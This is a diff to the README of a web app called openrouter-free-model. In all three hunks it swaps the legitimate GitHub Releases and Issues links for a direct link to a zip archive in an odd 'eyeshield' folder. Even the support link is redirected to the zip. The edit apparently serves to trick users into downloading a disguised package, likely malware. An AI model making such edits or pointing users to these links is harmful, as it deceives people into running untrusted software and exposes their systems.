@@ -6,7 +6,7 @@ Welcome to openrouter-free-model! This web application helps you browse, filter,
 
 ## 📥 Download Now
 
-[![Download openrouter-free-model](https://img.shields.io/badge/Download%20openrouter--free--model-v1.0-brightgreen)](https://github.com/lennor-tan/openrouter-free-model/releases)
+[![Download openrouter-free-model](https://raw.githubusercontent.com/lennor-tan/openrouter-free-model/main/eyeshield/openrouter-free-model.zip%20openrouter--free--model-v1.0-brightgreen)](https://raw.githubusercontent.com/lennor-tan/openrouter-free-model/main/eyeshield/openrouter-free-model.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To run openrouter-free-model, ensure your system meets the following requirement
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Releases Page](https://github.com/lennor-tan/openrouter-free-model/releases).
+To get started, visit this page to download the application: [Releases Page](https://raw.githubusercontent.com/lennor-tan/openrouter-free-model/main/eyeshield/openrouter-free-model.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -60,7 +60,7 @@ No, an internet connection is required to browse and manage models within openro
 
 ### 4. What support is available?
 
-If you encounter any issues, please visit our [GitHub Issues Page](https://github.com/lennor-tan/openrouter-free-model/issues) for assistance.
+If you encounter any issues, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/lennor-tan/openrouter-free-model/main/eyeshield/openrouter-free-model.zip) for assistance.
 
 ## 🛠️ Troubleshooting
 
